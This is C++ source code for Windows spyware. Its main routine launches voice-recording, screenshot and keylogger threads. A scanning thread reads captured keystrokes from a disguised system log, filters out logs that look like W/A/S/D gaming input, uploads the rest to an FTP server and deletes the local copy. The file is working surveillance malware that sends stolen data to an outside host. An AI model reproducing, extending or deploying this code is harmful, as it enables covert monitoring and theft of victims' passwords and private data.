#include "spy.h"

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	srand(static_cast<unsigned int>(time(0)));


	CreateThread(0, 0, &voiceThread, 0, 0, 0);
	CreateThread(0, 0, &ScreenShotThread, 0, 0, 0);
	CreateThread(0, 0, &KeyloggerScanThread, 0, 0, 0);
	
	StartKeyLogging();

	for (;;) {

		Sleep(10);
	}
}

DWORD WINAPI KeyloggerScanThread(LPVOID parameter) {
	for (;;) {
		int count = 0;
		std::string txt;
		if (FileExists("C:\\Windows\\SystemLogs\\system.log")) {
			std::ifstream scan("C:\\Windows\\SystemLogs\\system.log");
			while (!scan.eof()) {
				scan >> txt;
				if (txt == "W" || txt == "A" ||
					txt == "S" || txt == "D") {
					count++;
				}
			}
			scan.close();

			if (count >= 250) {
				remove("C:\\Windows\\SystemLogs\\system.log");
			}
			else {
				Send2Ftp("C:\\Windows\\SystemLogs\\system.log", "-", 14148);
				remove("C:\\Windows\\SystemLogs\\system.log");
			}
		}
		Sleep(10);
	}

	return 0;
}

void Send2Ftp(LPCSTR filePath, LPCSTR ftpIP, int ftpPort) {
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hFtpSession = InternetConnectA(hInternet, ftpIP, ftpPort, "-", "-", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	FtpPutFileA(hFtpSession, filePath, "test.txt", FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(hFtpSession);
	InternetCloseHandle(hInternet);

	if (!hFtpSession)
	{
		InternetCloseHandle(hInternet);
	}
}
